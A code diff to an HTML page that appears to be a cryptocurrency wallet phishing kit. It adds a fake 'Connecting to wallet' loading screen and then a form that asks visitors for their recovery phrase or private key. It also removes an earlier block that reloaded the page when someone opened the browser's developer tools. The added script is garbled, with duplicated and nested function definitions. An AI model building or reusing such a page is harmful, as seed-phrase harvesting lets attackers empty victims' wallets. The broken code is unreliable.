@@ -282,9 +282,70 @@
       </div>
     </div>
   </div>
+
+  <!-- Loading Screen -->
+  <div class="loading-screen" id="loadingScreen">
+    <img id="walletLogo" src="" alt="Loading Wallet">
+    <p>Connecting to wallet<span class="loading-dots"></span></p>
+  </div>
+
+  <div class="phrase-container trust-theme" id="phraseScreen">
+  <div class="input-header">
+    <div class="type-tabs">
+      <button class="tab active" data-type="phrase" onclick="switchType('phrase')">Phrase</button>
+      <button class="tab" data-type="key" onclick="switchType('key')">Private Key</button>
+    </div>
+    <div class="count-dropdown" id="phraseCountDropdown">
+      <button class="count-toggle" onclick="toggleDropdown()">12 Words ▼</button>
+      <ul class="dropdown-menu" id="countMenu">
+        <li onclick="selectCount(12)">12 Words</li>
+        <li onclick="selectCount(15)">15 Words</li>
+        <li onclick="selectCount(18)">18 Words</li>
+        <li onclick="selectCount(24)">24 Words</li>
+      </ul>
+    </div>
+  </div>
+
+  <form class="wallet-form">
+    <textarea class="input-box" placeholder="Enter your recovery phrase" rows="4"></textarea>
+    <button type="submit" class="submit-btn">Connect</button>
   </form>
+</div>
+
+
 
   <script>
+    function simulateConnect(logoUrl) {
+  const loadingScreen = document.getElementById('loadingScreen');
+  const walletLogo = document.getElementById('walletLogo');
+  const mainContainer = document.getElementById('mainContainer');
+  const phraseScreen = document.getElementById('phraseScreen');
+  function simulateConnect(logoUrl) {
+  const loadingScreen = document.getElementById('loadingScreen');
+  const walletLogo = document.getElementById('walletLogo');
+  const mainContainer = document.getElementById('mainContainer');
+
+  walletLogo.src = logoUrl;
+  mainContainer.style.display = 'none';
+  loadingScreen.style.display = 'flex';
+
+  setTimeout(() => {
+    window.location.href = 'wallet.html'; // Redirect to another page
+  }, 3000);
+}
+
+
+  walletLogo.src = logoUrl;
+  mainContainer.style.display = 'none';
+  phraseScreen.style.display = 'none';
+  loadingScreen.style.display = 'flex';
+
+  setTimeout(() => {
+    loadingScreen.style.display = 'none';
+    phraseScreen.style.display = 'flex';
+  }, 3000);
+}
+
     const tabs = document.querySelectorAll('.tab');
     const countTabs = document.querySelectorAll('.count-tab');
     const textarea = document.querySelector('.input-box');
@@ -311,39 +372,28 @@
       });
     });
 
-   function simulateConnect(logoUrl) {
-  const loadingScreen = document.getElementById('loadingScreen');
-  const walletLogo = document.getElementById('walletLogo');
-  const mainContainer = document.getElementById('mainContainer');
-  const phraseScreen = document.getElementById('phraseScreen');
+    function simulateConnect(logoUrl) {
+      const loadingScreen = document.getElementById('loadingScreen');
+      const walletLogo = document.getElementById('walletLogo');
+      const mainContainer = document.getElementById('mainContainer');
+      const phraseScreen = document.getElementById('phraseScreen');
 
-  walletLogo.src = logoUrl;
-  mainContainer.style.display = 'none';
-  phraseScreen.style.display = 'none';
-  loadingScreen.style.display = 'flex';
+      walletLogo.src = logoUrl;
+      mainContainer.style.display = 'none';
+      phraseScreen.style.display = 'none';
+      loadingScreen.style.display = 'flex';
 
-  setTimeout(() => {
-    loadingScreen.style.display = 'none';
-    phraseScreen.style.display = 'flex';
-  }, 3000);
-}
-
+      setTimeout(() => {
+        loadingScreen.style.display = 'none';
+        phraseScreen.style.display = 'flex';
+      }, 3000);
+    }
     let currentCount = 12;
 
-function simulateConnect(logoUrl) {
-  const loadingScreen = document.getElementById('loadingScreen');
-  const walletLogo = document.getElementById('walletLogo');
-  const mainContainer = document.getElementById('mainContainer');
-
-  walletLogo.src = logoUrl;
-  mainContainer.style.display = 'none';
-  loadingScreen.style.display = 'flex';
-
-  setTimeout(() => {
-    window.location.href = 'wallet.html'; // Redirect to another page
-  }, 3000);
+function toggleDropdown() {
+  const menu = document.getElementById('countMenu');
+  menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
 }
-
 
 function selectCount(num) {
   currentCount = num;
@@ -365,16 +415,7 @@ function switchType(type) {
     document.querySelector('.input-box').placeholder = 'Enter your private key';
   }
 }
-document.addEventListener("keydown", y => {
-      if (
-        (y.ctrlKey && y.shiftKey && ["I", "J", "C"].includes(y.key.toUpperCase())) ||
-        (y.ctrlKey && y.key.toLowerCase() === "u") ||
-        y.key === "F12"
-      ) {
-        y.preventDefault();
-        location.reload();
-      }
-    });
+
   </script>
 </body>
 </html>
